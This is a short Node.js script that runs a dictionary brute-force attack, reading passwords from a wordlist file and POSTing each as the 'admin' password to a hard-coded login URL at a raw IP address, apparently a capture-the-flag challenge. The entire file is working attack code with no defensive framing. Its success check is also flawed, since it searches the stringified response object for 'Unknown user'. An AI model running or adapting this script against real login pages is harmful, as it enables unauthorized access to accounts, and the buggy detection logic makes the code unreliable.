var request = require('request');
const readline = require('readline');
const fs = require('fs');

const readInterface = readline.createInterface({
    input: fs.createReadStream('diccionario.txt'),
    //output: process.stdout,
    console: false
});

var username = "admin";

const probardatos = async (password) => {

	var options = {
	  'method': 'POST',
	  'url': 'http://34.74.105.127/edea36b776/login',
	  'headers': {
	    'Content-Type': 'application/x-www-form-urlencoded'
	  },
	  form : {
	    	'username': 'admin',
		   	'password': password
		}
	};

    return new Promise(function(resolve, reject){

    	request(options, function (error, response) {
			  if (error) throw new Error(error);
			  
			  if (response.toString().indexOf("Unknown user") !== -1) {
			  	console.log(response) 
			  } else {
			  	console.log("Not Found")
			  } 
			  
			  resolve(response);
		});
    });
}; 

var passwords = [];

readInterface.on('line', function(line) {
    
    var password = line;
    passwords.push(line);

});

const tryAll = async () => {

	for (var i = 0; i < passwords.length; i++){

		console.log("Checking new values for user and password ... " + username + ' ' + passwords[i]);

	    await probardatos(passwords[i]).
	            then(function(res) {

	              if (res.toString().indexOf("Unknown user") !== -1) console.log(res)

	            }).catch(function(err) {
	              console.log(err);
	    });
	}

};

readInterface.on('close', tryAll);